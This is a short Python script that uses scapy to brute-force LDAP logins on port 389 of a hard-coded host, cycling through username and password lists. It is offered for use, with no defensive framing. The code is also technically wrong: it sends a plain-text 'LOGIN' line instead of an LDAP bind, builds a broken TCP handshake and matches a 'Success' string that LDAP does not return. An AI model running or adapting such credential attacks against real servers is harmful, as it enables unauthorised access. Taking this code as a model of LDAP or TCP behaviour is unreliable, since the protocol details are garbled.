from scapy.all import *

def ldap_bruteforce(ip, user_list, pass_list):
    for user in user_list:
        for password in pass_list:
            pkt = IP(dst=ip)/TCP(dport=389, flags='S')
            resp = sr1(pkt, timeout=2, verbose=False)
            if resp and resp.haslayer(TCP):
                auth_pkt = IP(dst=ip)/TCP(dport=389, flags='A', ack=resp[TCP].seq+1)/Raw(load=f"LOGIN {user} {password}\r\n")
                resp = sr1(auth_pkt, timeout=2, verbose=False)
                if resp and resp.haslayer(Raw):
                    if b"Success" in resp[Raw].load:
                        print(f"Valid credentials found: {user}/{password}")
                        return

ip = "192.168.1.10"
user_list = ["admin", "user"]
pass_list = ["1234", "password"]
ldap_bruteforce(ip, user_list, pass_list)
